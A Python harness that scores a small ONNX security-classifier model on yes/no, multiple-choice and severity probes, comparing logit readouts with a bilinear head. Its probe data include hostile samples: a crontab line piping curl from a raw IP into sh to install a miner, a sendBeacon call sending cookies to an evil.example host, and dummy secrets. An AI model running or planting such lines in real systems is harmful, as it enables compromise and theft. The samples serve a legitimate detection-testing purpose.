"""three_modes.py — a single harness that measures the THREE System-1 modes (noul / choice / score)
on any CT0 ONNX graph with the hidden state exposed, by TWO independent methods:

  methods:  "logits"  — classic decide() over the LM label tokens
            "head"    — the recovered bilinear head (head.bin, fp16)

Main interface:
    measure(graph_path) -> {"noul": {...}, "choice": {...}, "score": {...}}
    each block: {"logits": acc/n, "head": acc/n, "n": n, "rows": [...]}

    measure_hiddens(npz, meta) -> same structure, but reading hiddens already saved from a
    PyTorch reference (validates the harness WITHOUT the graph).

Domain facts this file implements (EVIDENCE.md §33, §42, §46):

1. `<decide>` is NOT a token. It becomes 4 tokens: '><' 'dec' 'ide' '>'. The query hidden
   position is the FINAL '>', immediately before `<|im_end|>`. A `find_sub` over
   tok("<decide>") fails silently and returns the wrong position — it was the cause of 6h lost.
   Here the position comes from `decide_pos()`: the last token before the `<|im_end|>` that precedes
   `assistant`. No silent fallback: if not found, it raises.

2. The head is a POINTER HEAD: q = hidden at `<decide>` (ONE per question), k = hidden at the token of
   each option. The inverse (q@option, k@last) gives 3/8 instead of 8/8.

3. `score` is ONE scalar, not K scores: raw = headScore(hq, hk); p = sigmoid(raw);
   level = clamp(round(p*(K-1)+1), 1, K). That is what `systemone.ts:187-192` does.

4. Decode is ALWAYS token-by-token (stride=1). The decode-only graph has no attention_mask, so
   multi-token prefill produces garbage (cos 0.012). The cache is fed back from `present_*`->`past_*`.

5. Normalizing the hidden HURTS (EVIDENCE §21a): the head expects the raw scale. Do not normalize.
"""
import json
import os
import re
import struct
import sys

import numpy as np

HERE = os.path.dirname(os.path.abspath(__file__))
ART = os.path.dirname(HERE)                       # ~/cai/ct0-artifacts
HEAD_BIN = os.path.join(os.path.dirname(ART), "alias3-mlc", "head.bin")
TOK_DIR = os.path.join(ART, "tok")
PROBES = os.path.join(os.path.dirname(ART), "ct0-onnx-research", "probes.json")

HID_NAME = "/model/norm/Mul_1_output_0"
YES, NO = 9175, 2665          # 'Yes' / 'No' (CT0 tokenizer)
DIGITS = [16, 17, 18, 19, 20]  # '1'..'5'


# ============================================================== head
def load_head(path=None):
    """Reads head.bin: [uint32 jsonLen][json][q fp16][q.bias fp16][k fp16][k.bias fp16]."""
    path = path or HEAD_BIN
    b = open(path, "rb").read()
    n = struct.unpack("<I", b[:4])[0]
    meta = json.loads(b[4:4 + n])
    off = 4 + n

    def take(k):
        nonlocal off
        a = np.frombuffer(b, dtype="<f2", count=k, offset=off).astype(np.float32)
        off += k * 2
        return a

    D, Hs = meta["headDim"], meta["hiddenSize"]
    hd = dict(q=take(D * Hs).reshape(D, Hs), qb=take(D),
              k=take(D * Hs).reshape(D, Hs), kb=take(D),
              headDim=D, hiddenSize=Hs,
              temperature=float(meta["temperature"]),
              scoreOffset=float(meta.get("score_offset") or 0.0),
              meta=meta)
    exp = 2 * (D * Hs * 2 + D * 2)
    assert len(b) - 4 - n == exp, "head.bin has payload %d, expected %d" % (len(b) - 4 - n, exp)
    return hd


H = load_head()   # global head, used by the tests


def head_score(hd, hq, hk):
    """Raw head score. `hq` = hidden at <decide>; `hk` = hidden of the option/last position.

    hk may be [n, 2560], in which case it returns [n] (one per option).
    No hidden normalization (EVIDENCE §21a: normalizing drops 8/8 to 7/8).
    """
    a = np.atleast_2d(np.asarray(hq, dtype=np.float32)) @ hd["q"].T + hd["qb"]
    b = np.atleast_2d(np.asarray(hk, dtype=np.float32)) @ hd["k"].T + hd["kb"]
    s = (a * b).sum(-1) / hd["temperature"] + hd["scoreOffset"]
    return float(s[0]) if np.ndim(s) == 1 and s.shape[0] == 1 and np.ndim(hk) == 1 else s


def sigmoid(z):
    return 1.0 / (1.0 + np.exp(-z))


def to_level(raw, K=5):
    """systemone.ts:187-192 — ONE scalar score mapped to 1..K by the scaled sigmoid."""
    p = sigmoid(raw)
    return int(max(1, min(K, round(p * (K - 1) + 1))))


# ============================================================== positions
def _decoded_tokens(tok, ids):
    return [tok.decode([int(i)]) for i in ids]


def decide_pos(ids, tok=None):
    """Index of the query hidden: the '<|im_end|>' that precedes `assistant`, minus 1.

    Accepts `ids` as a list of ids (uses the tokenizer to decode) or as a list of already
    decoded strings (used in the tests). Never does find_sub of '<decide>' — it is 4 tokens
    ('><' 'dec' 'ide' '>') and the search silently fails (EVIDENCE §33a).
    """
    if ids and isinstance(ids[0], str):
        dec = list(ids)
    else:
        if tok is None:
            from transformers import AutoTokenizer
            tok = AutoTokenizer.from_pretrained(TOK_DIR)
        dec = _decoded_tokens(tok, ids)
    im_end = [i for i, s in enumerate(dec) if s == "<|im_end|>"]
    if not im_end:
        raise ValueError("decide_pos: no <|im_end|> in ids %r" % (dec[-8:],))
    asst = [i for i, s in enumerate(dec) if s.strip() == "assistant"]
    # rule: the <|im_end|> immediately before the `assistant` of the response turn.
    # Without `assistant` (truncated sequence, as in the test), the last <|im_end|>.
    cand = [i for i in im_end if asst and i < asst[-1]]
    end = cand[-1] if cand else im_end[-1]
    # guard that catches the real bug: the token BEFORE the <|im_end|> of <decide> is always the final '>'
    # ('><' 'dec' 'ide' '>'). If it is not, the position is wrong and the score comes from someone else's hidden.
    if end == 0:
        raise ValueError("decide_pos: <|im_end|> at position 0, no previous token")
    if dec[end - 1] != ">":
        raise ValueError("decide_pos: token before <|im_end|> is %r, expected '>' (end of <decide>)"
                         % (dec[end - 1],))
    return end - 1


def last_pos(ids):
    return len(ids) - 1


def opt_positions(prompt, offs, tok=None):
    """Indices of the tokens that cover the LAST character of each `</opt>`.

    Matches by the LAST CHARACTER via offsets, never by find_sub of the marker sequence:
    `</opt><opt>` merges into ['</','opt','><','opt'] (EVIDENCE §21a) and exact-sequence
    matchers miss options.
    """
    out = []
    for m in re.finditer(r"</opt>", prompt):
        c = m.end() - 1
        hit = [t for t, (s, e) in enumerate(offs) if s <= c < e]
        if not hit:
            raise ValueError("opt_positions: no token covers char %d" % c)
        out.append(hit[0])
    return out


# ============================================================== prompts (identical to adapt/collect.py)
def render(state, q):
    return ("<|im_start|>system\nYou are a security decision function. Answer with exactly one word: Yes or No.<|im_end|>\n"
            "<|im_start|>user\n<state>%s</state>\n<q>%s</q><decide><|im_end|>\n<|im_start|>assistant\n" % (state, q))


HOLD = [
 {"want":"yes","state":"<div id=out></div><script>x=new URLSearchParams(location.search);out.innerHTML=x.get('q')","q":"Is user input written into the DOM without sanitization?"},
 {"want":"yes","state":"app.get('/admin', (req,res)=>{ res.json(users) })","q":"Is this endpoint missing an authorization check?"},
 {"want":"yes","state":"token = 'eyJhbGciOiJub25lIn0.eyJ1aWQiOjF9.'","q":"Is this JWT unsigned or using alg none?"},
 {"want":"yes","state":"crontab: */1 * * * * curl -s http://45.9.1.2/miner | sh","q":"Is this a persistence or miner installation?"},
 {"want":"no","state":"<button onclick=\"document.getElementById('m').classList.toggle('open')\">Menu</button>","q":"Is user input written into the DOM without sanitization?"},
 {"want":"no","state":"app.get('/admin', requireAuth('admin'), (req,res)=>res.json(users))","q":"Is this endpoint missing an authorization check?"},
 {"want":"no","state":"token = 'eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjF9.8fJ2kL9x'","q":"Is this JWT unsigned or using alg none?"},
 {"want":"no","state":"crontab: 0 2 * * * /usr/bin/backup --daily","q":"Is this a persistence or miner installation?"},
]
CHOICE_Q = "Which vulnerability class does this code contain?"
SEV_Q = "How severe is the security risk in this content? (1=none, 5=critical)"
CHOICE = [
 dict(state="document.getElementById('out').innerHTML = e.data;  // message handler sem origin check",
      options=["dom-xss","insecure-forms","exfil-egress","csp-misconfig"], want="dom-xss"),
 dict(state='<form action="http://example.com/login" method="post"><input type="password"></form>',
      options=["dom-xss","insecure-forms","exfil-egress","csp-misconfig"], want="insecure-forms"),
 dict(state="navigator.sendBeacon('https://collect.evil.example/px?d='+document.cookie)",
      options=["dom-xss","insecure-forms","exfil-egress","csp-misconfig"], want="exfil-egress"),
 dict(state="<meta http-equiv='Content-Security-Policy' content=\"default-src * 'unsafe-inline'\">",
      options=["dom-xss","insecure-forms","exfil-egress","csp-misconfig"], want="csp-misconfig"),
 dict(state="localStorage.setItem('admin_token','ADM-77ac12ff90ee')",
      options=["dom-xss","secret-scan","exfil-egress","postmessage"], want="secret-scan"),
 dict(state="window.addEventListener('message', e => { document.body.innerHTML = e.data })",
      options=["dom-xss","secret-scan","postmessage","supply-chain"], want="postmessage"),
 dict(state='<script src="https://cdn.example/x.js"></script>',
      options=["dom-xss","secret-scan","postmessage","supply-chain"], want="supply-chain"),
 dict(state='Traceback (most recent call last): File "/srv/app/x.py" DSN: postgres://admin:pw@10.0.0.5/db',
      options=["error-disclosure","dom-xss","insecure-forms","postmessage"], want="error-disclosure"),
]
SCORE = [
 dict(state="<h1>Hello</h1><p>Static page, no scripts.</p>", want_max=2),
 dict(state="<meta http-equiv='Content-Security-Policy' content=\"default-src 'self'\">", want_max=2),
 dict(state='<a href="/docs" target="_blank">Docs</a>', want_max=3),
 dict(state='<form action="http://example.com/login"><input type="password"></form>', want_min=3),
 dict(state="localStorage.setItem('api_key','sk_live_9f8a7b6c5d4e3f2a1b0c')", want_min=4),
 dict(state="document.getElementById('out').innerHTML = e.data", want_min=4),
 dict(state="postgres://admin:S3cr3tDbPass@10.0.0.5:5432/acme  (exposed in a stack trace)", want_min=4),
]


def all_probes():
    """The 31 probes in the same order as adapt/collect.py: 16 noul, 8 choice, 7 score."""
    base = json.load(open(PROBES))
    out = [dict(kind="noul", i=i, split="base", want=p["want"], state=p["state"], q=p["q"])
           for i, p in enumerate(base)]
    out += [dict(kind="noul", i=len(base) + i, split="holdout", want=p["want"], state=p["state"], q=p["q"])
            for i, p in enumerate(HOLD)]
    out += [dict(kind="choice", i=i, want=c["want"], state=c["state"], options=c["options"])
            for i, c in enumerate(CHOICE)]
    out += [dict(kind="score", i=i, state=c["state"],
                 **{k: c[k] for k in c if k != "state"}) for i, c in enumerate(SCORE)]
    return out


def prompt_for(p):
    if p["kind"] == "noul":
        return render(p["state"], p["q"])
    if p["kind"] == "choice":
        return render(p["state"], CHOICE_Q + " " + "".join("<opt>%s</opt>" % o for o in p["options"]))
    return render(p["state"], SEV_Q)


# ============================================================== ONNX graph (token-by-token decode)
def _session(graph_path, providers=None):
    import onnxruntime as ort
    so = ort.SessionOptions()
    so.log_severity_level = 3
    prov = providers or (["CoreMLExecutionProvider", "CPUExecutionProvider"]
                         if sys.platform == "darwin" else ["CPUExecutionProvider"])
    try:
        return ort.InferenceSession(graph_path, so, providers=prov)
    except Exception:
        return ort.InferenceSession(graph_path, so, providers=["CPUExecutionProvider"])


def run_prompt(sess, tok, prompt, want_hidden=True):
    """Decode ALWAYS token-by-token (stride=1), cache fed back present_*->past_*.

    The decode-only graph has no `attention_mask`: multi-token prefill produces garbage (cos 0.012).
    Returns (ids, offs, H[seq,2560], logits_of_the_last_position).
    """
    enc = tok(prompt, add_special_tokens=False, return_offsets_mapping=True)
    ids, offs = enc["input_ids"], [tuple(x) for x in enc["offset_mapping"]]
    in_names = [i.name for i in sess.get_inputs()]
    out_names = [o.name for o in sess.get_outputs()]
    assert HID_NAME in out_names, "graph without hidden %s — not usable for the 3 modes" % HID_NAME
    if "attention_mask" in in_names:
        raise AssertionError("this graph HAS attention_mask (it is the canonical one with Scan): use stride=1 "
                             "anyway, but the prefill validation is a different test")

    st = {}
    for i in sess.get_inputs():
        if i.name == "input_ids":
            continue
        shp = [x if isinstance(x, int) else 1 for x in i.shape]
        st[i.name] = np.zeros(shp, dtype=np.float32)

    hs, lg = [], None
    for tid in ids:
        feeds = dict(st)
        feeds["input_ids"] = np.array([[tid]], dtype=np.int64)
        o = dict(zip(out_names, sess.run(None, feeds)))
        if want_hidden:
            hs.append(np.asarray(o[HID_NAME])[0, 0].astype(np.float32))
        lg = np.asarray(o["logits"])[0, 0].astype(np.float32)
        for L in range(32):
            for a, b in (("present_conv", "past_conv"), ("present_recurrent", "past_recurrent")):
                k = "%s.%d" % (a, L)
                if k in o:
                    st["%s.%d" % (b, L)] = np.asarray(o[k])
            for sfx in ("key", "value"):
                k = "present.%d.%s" % (L, sfx)
                if k in o:
                    st["past_key_values.%d.%s" % (L, sfx)] = np.asarray(o[k])
    return ids, offs, np.stack(hs), lg


# ============================================================== the 3 modes over H per probe
def eval_probe(hd, p, ids, offs, Hseq, lg, prompt=None, tok=None):
    """Resolves ONE probe by both methods. Returns a dict with the result of each method.

    `prompt` is the exact text that produced `ids`/`offs` (the `<decide>` came from it); if None, it is
    rebuilt from `p` by `prompt_for`.
    """
    if tok is None:
        tok = _tok()
    prompt = prompt if prompt is not None else prompt_for(p)
    di = decide_pos(ids, tok)
    li = last_pos(ids)
    row = dict(kind=p["kind"], i=p["i"], want=p.get("want"))
    if p["kind"] == "noul":
        raw = head_score(hd, Hseq[di], Hseq[li])
        p_head = float(sigmoid(raw))
        pred_head = "yes" if p_head >= 0.5 else "no"
        # logits: max(logit Yes) > max(logit No) (EVIDENCE §34/§36)
        pred_lg = "yes" if lg[YES] > lg[NO] else "no"
        row.update(pos_decide=di, pos_last=li, raw=raw, p_head=p_head,
                   p_logits=float(sigmoid(lg[YES] - lg[NO])),
                   pred_head=pred_head, pred_logits=pred_lg,
                   ok_head=pred_head == p["want"], ok_logits=pred_lg == p["want"])
        return row
    if p["kind"] == "choice":
        ks = opt_positions(prompt, offs)
        assert len(ks) == len(p["options"]), "options=%d, positions=%d" % (len(p["options"]), len(ks))
        s_head = np.asarray(head_score(hd, Hseq[di], Hseq[np.array(ks)])).ravel()
        top_head = p["options"][int(np.argmax(s_head))]
        # logits: the FIRST token of each option's label (EVIDENCE §28/§33c-2, "logits (1st
        # token of the option) 15/16"). Summing all the label's tokens gives 3/8 — different metrics,
        # and the first-token one is what EVIDENCE uses.
        s_lg = [float(lg[int(tok.encode(o, add_special_tokens=False)[0])]) for o in p["options"]]
        top_lg = p["options"][int(np.argmax(s_lg))]
        row.update(pos_decide=di, opt_pos=ks, scores_head=s_head.tolist(), scores_logits=s_lg,
                   pred_head=top_head, pred_logits=top_lg,
                   ok_head=top_head == p["want"], ok_logits=top_lg == p["want"])
        return row
    # score: ONE scalar -> 1..K (systemone.ts:187-192)
    raw = head_score(hd, Hseq[di], Hseq[li])
    lv_head = to_level(raw, 5)
    lv_lg = int(np.argmax([lg[t] for t in DIGITS])) + 1
    ok_h = (lv_head <= p["want_max"]) if "want_max" in p else (lv_head >= p["want_min"])
    ok_l = (lv_lg <= p["want_max"]) if "want_max" in p else (lv_lg >= p["want_min"])
    row.update(pos_decide=di, raw=raw, level_head=lv_head, level_logits=lv_lg,
               ok_head=bool(ok_h), ok_logits=bool(ok_l))
    return row


def _aggregate(rows, kind):
    sel = [r for r in rows if r["kind"] == kind]
    n = len(sel)
    return {"logits": (sum(1 for r in sel if r["ok_logits"]) / n if n else 0.0),
            "head": (sum(1 for r in sel if r["ok_head"]) / n if n else 0.0),
            "n": n,
            "logits_hits": sum(1 for r in sel if r["ok_logits"]),
            "head_hits": sum(1 for r in sel if r["ok_head"]),
            "rows": sel}


def measure(graph_path, head_path=None, probes=None, verbose=True):
    """Measures the 3 modes on an ONNX graph. Return: {noul:{logits,head,n}, choice:{...}, score:{...}}."""
    from transformers import AutoTokenizer
    hd = load_head(head_path) if head_path else H
    tok = AutoTokenizer.from_pretrained(TOK_DIR)
    sess = _session(graph_path)
    rows = []
    for k, p in enumerate(probes or all_probes()):
        pr = prompt_for(p)
        ids, offs, Hseq, lg = run_prompt(sess, tok, pr)
        row = eval_probe(hd, p, ids, offs, Hseq, lg)
        rows.append(row)
        if verbose:
            print("  [%2d/%d] %-6s %d tok  head=%s logits=%s" %
                  (k + 1, len(probes or all_probes()), p["kind"],
                   len(ids), row["ok_head"], row["ok_logits"]), flush=True)
    return {kind: _aggregate(rows, kind) for kind in ("noul", "choice", "score")}


_TOK = None


def _tok():
    global _TOK
    if _TOK is None:
        from transformers import AutoTokenizer
        _TOK = AutoTokenizer.from_pretrained(TOK_DIR)
    return _TOK


def measure_hiddens(npz_path, meta_path, head_path=None, verbose=True):
    """Same measurement, but over PyTorch reference hiddens (harness validation)."""
    hd = load_head(head_path) if head_path else H
    tok = _tok()
    z = np.load(npz_path, allow_pickle=False)
    Hm, LEN, LOG = z["H"], z["lengths"], z["logits"]
    meta = json.load(open(meta_path))
    OFF = np.concatenate([[0], np.cumsum(LEN)[:-1]])
    rows = []
    for j, r in enumerate(meta):
        ids, offs = list(r["ids"]), [tuple(x) for x in r["offs"]]
        p = {"kind": r["kind"], "i": r["i"]}
        if r["kind"] == "choice":
            p["options"] = r["options"]
            p["want"] = r["want"]
        elif r["kind"] == "noul":
            p["want"] = r["want"]
        else:
            for kk in ("want_max", "want_min"):
                if kk in r:
                    p[kk] = r[kk]
        Hseq = Hm[OFF[j]:OFF[j] + int(LEN[j])]
        row = eval_probe(hd, p, ids, offs, Hseq, LOG[j], prompt=r["prompt"], tok=tok)
        rows.append(row)
        if verbose:
            print("  [%2d/%d] %-6s %3d tok  head=%s logits=%s" %
                  (j + 1, len(meta), r["kind"], len(ids), row["ok_head"], row["ok_logits"]), flush=True)
    return {kind: _aggregate(rows, kind) for kind in ("noul", "choice", "score")}


def summary(m):
    parts = []
    for k in ("noul", "choice", "score"):
        d = m[k]
        parts.append("%s logits %d/%d head %d/%d" %
                     (k, d["logits_hits"], d["n"], d["head_hits"], d["n"]))
    return " · ".join(parts)


if __name__ == "__main__":
    a = sys.argv[1:]
    if not a:
        print(__doc__)
        sys.exit(0)
    if a[0] == "--hiddens":
        m = measure_hiddens(a[1], a[2])
    else:
        m = measure(a[0])
    print("\n" + summary(m))

